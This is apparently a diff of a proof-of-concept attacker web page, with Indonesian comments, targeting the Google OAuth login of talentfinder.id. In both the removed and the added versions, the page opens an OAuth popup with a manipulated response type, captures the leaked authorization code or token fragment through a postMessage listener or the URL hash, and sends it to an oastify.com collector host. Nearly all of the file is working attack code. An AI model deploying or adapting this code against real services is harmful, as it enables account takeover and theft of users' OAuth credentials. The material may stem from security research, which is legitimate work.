@@ -1,30 +1,44 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Attacker Website</title>
-</head>
+<!doctype html>
+<html>
 <body>
-    <input type="button" value="exploit" onclick="exploit()">
-    <script>
-        function exploit() {
-            window.open("https://accounts.google.com/o/oauth2/auth?response_type=code,id_token&redirect_uri=http%3A%2F%2Ftalentfinder.id%2Fapplication%2Flogin%2Fgoogle.php&client_id=387722121931-kas65ot5rtre0c96hund00aeopcb7rgo.apps.googleusercontent.com&scope=openid+email+profile&access_type=offline&approval_prompt=force", "", "width=1000, height=1000");
-        }
 
-        window.addEventListener('load', () => {
-            const fragment = window.location.hash;
-            if (fragment) {
-                const encodedFragment = encodeURIComponent(fragment);
-                fetch('https://l6s6r1dv2w257i7h8bf1koqcs3yumlaa.oastify.com', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                    },
-                    body: `${encodedFragment}`,
-                });
-            }
-        });
-    </script>
+<button onclick="start()">Login OAuth</button>
+
+<script>
+
+function start() {
+
+    // buka popup OAuth
+    window.open(
+      "https://accounts.google.com/o/oauth2/auth?response_type=code,id_token&redirect_uri=http%3A%2F%2Ftalentfinder.id%2Fapplication%2Flogin%2Fgoogle.php&client_id=387722121931-kas65ot5rtre0c96hund00aeopcb7rgo.apps.googleusercontent.com&scope=openid+email+profile&access_type=offline&approval_prompt=force",
+      "_blank"
+    );
+
+}
+
+// listener buat nerima postMessage
+window.addEventListener("message", function(event) {
+
+    console.log("DATA MASUK:");
+    console.log(event.data);
+
+    // ambil URL yang bocor
+    let leaked = event.data.url;
+
+    // parse query
+    let url = new URL(leaked);
+
+    // ambil oauth code
+    let code = url.searchParams.get("code");
+
+    console.log("OAUTH CODE =", code);
+
+    // kirim ke server attacker
+    fetch("https://ej1z4uqofpfykbkal4suxh355wbnzfn4.oastify.com/log?code=" + encodeURIComponent(code));
+
+});
+
+</script>
+
 </body>
 </html>
